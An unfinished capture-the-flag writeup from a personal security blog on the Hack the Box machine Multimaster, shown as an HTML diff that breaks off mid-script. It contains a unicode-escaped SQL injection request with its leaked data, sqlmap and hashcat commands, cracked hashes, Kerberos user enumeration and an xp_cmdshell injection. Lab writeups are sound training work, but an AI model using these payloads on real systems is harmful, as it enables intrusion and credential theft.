@@ -1,0 +1,1923 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Multimaster Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the insane-difficulty machine Multimaster from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the insane-difficulty machine Multimaster from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/multimaster/" /><meta property="og:url" content="https://zweilosec.github.io/posts/multimaster/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/1-multimaster-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-25T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/1-multimaster-infocard.png" /><meta property="twitter:title" content="Hack the Box - Multimaster Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2020-07-25T14:00:00+00:00","description":"Zweilosec’s writeup on the insane-difficulty machine Multimaster from https://hackthebox.eu","headline":"Hack the Box - Multimaster Writeup","image":"https://zweilosec.github.io/assets/img/1-multimaster-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/multimaster/"},"url":"https://zweilosec.github.io/posts/multimaster/"}</script><title>Hack the Box - Multimaster Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Multimaster Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Multimaster Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jul 25, 2020, 2:00 PM +0000" prep="on" > Jul 25, 2020 <i class="unloaded">2020-07-25T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6907 words">38 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---multimaster">HTB - Multimaster</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/1-multimaster-infocard.png" alt="Descriptive information card on the machine multimaster" /></p><p>Hold on to your seats, because this Insane Windows machine is a wild ride. TODO:Finish this writeup, there are more notes and stuff in the notes app if anything is missing…</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><ul><li>description with generic example<li>description with generic example</ul><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.179</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><p>At first my scan wouldn’t go through until I added the <code class="language-plaintext highlighter-rouge">-Pn</code> flag to stop nmap from sending ICMP probes. After that it proceeded normally.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ nmap -p- -sC -sV -oN multimaster.nmap 10.10.10.179 -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 12:17 EDT
+Nmap scan report for 10.10.10.179
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: MegaCorp
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-19 16:31:58Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-07-19T16:34:16+00:00
+| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+| Not valid before: 2020-03-08T09:52:26
+|_Not valid after:  2020-09-07T09:52:26
+|_ssl-date: 2020-07-19T16:34:55+00:00; +11m43s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49681/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+49744/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h35m44s, deviation: 3h07m51s, median: 11m42s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: MULTIMASTER
+|   NetBIOS computer name: MULTIMASTER\x00
+|   Domain name: MEGACORP.LOCAL
+|   Forest name: MEGACORP.LOCAL
+|   FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_  System time: 2020-07-19T09:34:20-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-07-19T16:34:17
+|_  start_date: 2020-07-18T22:51:09
+
+Nmap done: 1 IP address (1 host up) scanned in 486.11 seconds
+</pre></table></code></div></div><p>lots of ports open</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>rpcclient $&gt; lsaquery
+Domain Name: MEGACORP
+Domain Sid: S-1-5-21-3167813660-1240564177-918740779
+</pre></table></code></div></div><p>Capturing the burp request to the <code class="language-plaintext highlighter-rouge">/api/get/Colleagues</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>POST /api/getColleagues HTTP/1.1
+Host: 10.10.10.179
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.179/
+Content-Type: application/json;charset=utf-8
+Content-Length: 91
+Connection: close
+DNT: 1
+
+{"name":"\u0061\u0027\u0020\u006F\u0072\u0020\u0031\u003D\u0031\u003B\u0020\u002D\u002D"}
+</pre></table></code></div></div><p>This is the unicode escaped equivilent of <code class="language-plaintext highlighter-rouge">a' or 1=1; --</code> And the response:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Type: application/json; charset=utf-8
+Expires: -1
+Server: Microsoft-IIS/10.0
+X-AspNet-Version: 4.0.30319
+X-Powered-By: ASP.NET
+Date: Mon, 20 Jul 2020 20:34:22 GMT
+Connection: close
+Content-Length: 1821
+
+[{"id":1,"name":"Sarina Bauer","position":"Junior Developer","email":"sbauer@megacorp.htb","src":"sbauer.jpg"},{"id":2,"name":"Octavia Kent","position":"Senior Consultant","email":"okent@megacorp.htb","src":"okent.jpg"},{"id":3,"name":"Christian Kane","position":"Assistant Manager","email":"ckane@megacorp.htb","src":"ckane.jpg"},{"id":4,"name":"Kimberly Page","position":"Financial Analyst","email":"kpage@megacorp.htb","src":"kpage.jpg"},{"id":5,"name":"Shayna Stafford","position":"HR Manager","email":"shayna@megacorp.htb","src":"shayna.jpg"},{"id":6,"name":"James Houston","position":"QA Lead","email":"james@megacorp.htb","src":"james.jpg"},{"id":7,"name":"Connor York","position":"Web Developer","email":"cyork@megacorp.htb","src":"cyork.jpg"},{"id":8,"name":"Reya Martin","position":"Tech Support","email":"rmartin@megacorp.htb","src":"rmartin.jpg"},{"id":9,"name":"Zac Curtis","position":"Junior Analyst","email":"zac@magacorp.htb","src":"zac.jpg"},{"id":10,"name":"Jorden Mclean","position":"Full-Stack Developer","email":"jorden@megacorp.htb","src":"jorden.jpg"},{"id":11,"name":"Alyx Walters","position":"Automation Engineer","email":"alyx@megacorp.htb","src":"alyx.jpg"},{"id":12,"name":"Ian Lee","position":"Internal Auditor","email":"ilee@megacorp.htb","src":"ilee.jpg"},{"id":13,"name":"Nikola Bourne","position":"Head of Accounts","email":"nbourne@megacorp.htb","src":"nbourne.jpg"},{"id":14,"name":"Zachery Powers","position":"Credit Analyst","email":"zpowers@megacorp.htb","src":"zpowers.jpg"},{"id":15,"name":"Alessandro Dominguez","position":"Senior Web Developer","email":"aldom@megacorp.htb","src":"aldom.jpg"},{"id":16,"name":"MinatoTW","position":"CEO","email":"minato@megacorp.htb","src":"minato.jpg"},{"id":17,"name":"egre55","position":"CEO","email":"egre55@megacorp.htb","src":"egre55.jpg"}]
+</pre></table></code></div></div><p>next attempted to enumerate the valid users who have active accounts on this machine through Kerberos.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ python3 /home/zweilos/impacket/examples/GetNPUsers.py -outputfile multimaster.hash -format hashcat -usersfile /home/zweilos/htb/multimaster/users -no-pass -dc-ip 10.10.10.179 MEGACORP/egre55
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ckane doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User kpage doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User cyork doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rmartin doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User zac doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User alyx doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ilee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User nbourne doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User zpowers doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User aldom doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+</pre></table></code></div></div><p>used <a href="https://github.com/enablesecurity/wafw00f">wafw00f</a> to detect if there was a WAF, but none was detected <a href="https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/">https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/</a> <a href="https://github.com/0xInfection/Awesome-WAF#testing-methodology">https://github.com/0xInfection/Awesome-WAF#testing-methodology</a> <a href="https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py">https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py</a></p><p>mine <a href="https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body">https://stackoverflow.com/questions/40628603/sqlmap-post-json-data-as-body</a> <a href="https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json">https://www.yg.ht/blog/blog/archives/361/getting-sqlmap-to-detect-injection-points-through-json</a> sqlmap -r burppost —tamper charunicodetamper.py —dbs -delay 5 sqlmap -r burppost —tamper charunicodetamper.py —D Hub_DB -tables -delay 5 sqlmap will automatically detect that there is JSON data in your POST and will ask if you would like for it to process it. sqlmap called hash sha384_generic_passwd <a href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a> verified that the hash was sha2-384 There were duplicates of each hash, only four unique;</p><p>hashcat -m 10800 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt Possible algorithms: Keccak-384</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$hashcat -m 17900 -a 0 -o hash.cracked hash /usr/share/wordlists/rockyou.txt
+snipped...
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Name........: Keccak-384
+Hash.Target......: hash
+Time.Started.....: Mon Jul 20 19:17:45 2020 (11 secs)
+Time.Estimated...: Mon Jul 20 19:17:56 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1309.3 kH/s (1.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 3/4 (75.00%) Digests
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 3094/14344385 (0.02%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: $HEX[21217265626f756e642121] -&gt; $HEX[042a0337c2a156616d6f732103]
+
+Started: Mon Jul 20 19:17:26 2020
+Stopped: Mon Jul 20 19:17:57 2020
+</pre></table></code></div></div><p>Hashcat was able to crack 3 out of 4 of the hashes</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ cat hash.cracked 
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
+68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
+</pre></table></code></div></div><p>Just because the usernames I got were in the database does not mean they can login to this machine. Maybe need to enumerate users from the the domain in another way since ldap and rpc were not helpful <a href="https://kalilinuxtutorials.com/mssql-injection">https://kalilinuxtutorials.com/mssql-injection</a> <a href="https://github.com/Keramas/mssqli-duet">https://github.com/Keramas/mssqli-duet</a> <a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/</a></p><p><a href="https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`">https://www.sqlservercentral.com/forums/topic/how-to-retrieve-active-directory-user-information-through-sql-server`</a>’ – exec xp_cmdshell ‘net group /domain’` returns same list as earlier user enumeration</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>USERS list
+james
+dai
+tushikikatomo
+zac
+lana
+andrew
+jorden
+alyx
+cyork
+rmartin
+DnsAdmins
+DnsUpdateProxy
+svc-nas
+svc-sql
+ckane
+kpage
+ilee
+nPourne
+</pre></table></code></div></div><p>from enum4linux</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> =========================================== 
+|    Getting domain SID for 10.10.10.179    |
+ =========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+Domain Name: MEGACORP
+Domain Sid: S-1-5-21-3167813660-1240564177-918740779
+[+] Host is part of a domain (not a workgroup)
+</pre></table></code></div></div><p><a href="https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253">https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253</a> <a href="https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/">https://froosh.wordpress.com/2005/10/21/hex-sid-to-decimal-sid-translation/</a> SID in HEX <code class="language-plaintext highlighter-rouge">0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000</code></p><p><a href="https://securityonline.info/mssqli-duet-sql-injection-script-for-mssql/">https://securityonline.info/mssqli-duet-sql-injection-script-for-mssql/</a> <a href="https://github.com/Keramas/mssqli-duet">https://github.com/Keramas/mssqli-duet</a></p><p><a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=https://lolz.guru/threads/1537485/&amp;prev=search&amp;pto=aue">https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=https://lolz.guru/threads/1537485/&amp;prev=search&amp;pto=aue</a></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+</pre><td class="rouge-code"><pre><span class="c1">#! / usr / bin / env python
+#This script enumerates domain users through MS SQL Server
+#Requires the SID of the domain
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+
+<span class="k">def</span> <span class="nf">little</span> <span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">.</span><span class="n">fromhex</span> <span class="p">(</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">t</span><span class="p">.</span><span class="n">reverse</span> <span class="p">()</span>
